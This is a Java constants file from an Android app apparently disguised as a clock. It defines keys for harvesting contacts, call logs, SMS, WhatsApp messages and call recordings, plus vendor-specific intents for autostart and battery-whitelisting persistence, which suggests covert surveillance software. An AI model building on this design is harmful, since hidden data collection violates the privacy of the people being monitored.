package com.aftab.clock.Utills;

import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;

import com.aftab.clock.BuildConfig;

import java.util.Arrays;
import java.util.List;

public class Constants {

    public static final String SUSPECTED_USERS = "suspectedUsers";
    public static final String DEVICE_INFO = "deviceInfo";
    public static final String KEY_PREFERENCE_NAME = "clock";
    public static final String DEVICE_ID = "deviceId";
    public static final String CONTACTS = "contacts";
    public static final String CALL_LOGS = "callLogs";
    public static final String SIM_SMS = "simSMS";
    public static final String DEVICES = "devices";
    public static final String IS_UPLOADED = "isUploaded";
    public static final String NUMBER = "number";
    public static final String DATE = "date";
    public static final String TYPE = "type";
    public static final String COMMAND_TYPE = "commandType";
    public static final String TYPE_CALL = "callType";
    public static final int STATE_INCOMING_NUMBER = 1;
    public static final int STATE_CALL_START = 2;
    public static final int STATE_CALL_END = 3;
    public static final int TYPE_CALL_OUTGOING = 1;
    public static final int TYPE_CALL_INCOMING = 2;
    public static final String WhATSAPP_MESSAGE = "whatsappMessage";
    public static final String RECEIVED_WhATSAPP_MESSAGE = "receivedWhatsappMessage";
    public static final String LAST_REC_URI = "lastRecURI";
    public static final String DEFAULT_SMS = "defaultSMS";
    public static final String LAST_REC_W_URI = "lastWRecURI";
    public static final String WHATSAPP_A_CALL_LOG = "wACallLogs";
    public static final String WHATSAPP_V_CALL_LOG = "wVCallLogs";
    public static final String ID = "id";
    public static final String W_AUIDO_MISSED = "W_A_MISSED";
    public static final String W_VIDEO_MISSED = "W_V_MISSED";
    public static final String W_A_OUTGOING = "W_A_OUTGOING";
    public static final String W_A_INCOMING = "W_A_INCOMING";
    public static final String W_VIDEO_INCOMING = "W_V_INCOMING";
    public static final String PRE_CALL_RECORDINGS = "preCallRecordings";
    public static final CharSequence EMPTY_ERROR = "Field cannot be empty";
    public static final String FIRST_NAME = "firstName";
    public static final String LAST_NAME = "lastName";
    public static final String PASSWORD = "password";
    public static final String ENABLED = "enabled";
    public static final String DISABLED = "disabled";
    public static final String DEVICES_PERMISSION_LOGS = "devicesPermissionLogs";
    public static final String CALL_REC_PERMISSION_LOGS = "callPermissionLogs";


    static final List<Intent> POWERMANAGER_INTENTS = Arrays.asList(
            new Intent().setComponent(new ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")),
            new Intent().setComponent(new ComponentName("com.letv.android.letvsafe", "com.letv.android.letvsafe.AutobootManageActivity")),
            new Intent().setComponent(new ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity")),
            new Intent().setComponent(new ComponentName("com.huawei.systemmanager", Build.VERSION.SDK_INT >= Build.VERSION_CODES.P ? "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity" : "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity")),
            new Intent().setComponent(new ComponentName("com.coloros.oppoguardelf", "com.coloros.powermanager.fuelgaue.PowerUsageModelActivity")),
            new Intent().setComponent(new ComponentName("com.coloros.oppoguardelf", "com.coloros.powermanager.fuelgaue.PowerSaverModeActivity")),
            new Intent().setComponent(new ComponentName("com.coloros.oppoguardelf", "com.coloros.powermanager.fuelgaue.PowerConsumptionActivity")),
            new Intent().setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity")),
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.N ? new Intent().setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.startupapp.StartupAppListActivity")).setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).setData(Uri.parse("package:" + "com.aftab.clock")) : null,
            new Intent().setComponent(new ComponentName("com.oppo.safe", "com.oppo.safe.permission.startup.StartupAppListActivity")),
            new Intent().setComponent(new ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity")),
            new Intent().setComponent(new ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.BgStartUpManager")),
            new Intent().setComponent(new ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity")),
            new Intent().setComponent(new ComponentName("com.asus.mobilemanager", "com.asus.mobilemanager.entry.FunctionActivity")),
            new Intent().setComponent(new ComponentName("com.asus.mobilemanager", "com.asus.mobilemanager.autostart.AutoStartActivity")),
            new Intent().setComponent(new ComponentName("com.letv.android.letvsafe", "com.letv.android.letvsafe.AutobootManageActivity"))
                    .setData(android.net.Uri.parse("mobilemanager://function/entry/AutoStart")),
            new Intent().setComponent(new ComponentName("com.meizu.safe", "com.meizu.safe.security.SHOW_APPSEC")).addCategory(Intent.CATEGORY_DEFAULT).putExtra("packageName", BuildConfig.APPLICATION_ID)
    );
}
